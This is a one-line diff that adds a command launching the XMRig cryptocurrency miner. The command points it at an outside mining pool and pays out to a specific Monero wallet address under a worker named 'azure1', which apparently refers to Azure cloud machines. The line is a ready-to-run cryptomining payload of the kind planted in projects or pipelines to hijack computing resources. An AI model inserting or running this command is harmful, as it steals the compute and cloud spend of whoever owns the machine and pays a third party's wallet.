@@ -1,0 +1,1 @@
+./xmrig -a rx -o stratum+tcp://rx.unmineable.com:13333 -u XMR:89zJSheDUdVijAqJCAdtGheL1ZWvhqsKAUzdEGYxEDPQ3guRzfEbsUnQuWu3Nk4Yss2ZfHMEDmzsG8QuHLrjCmRgDG7ks9f.azure1 -p x 
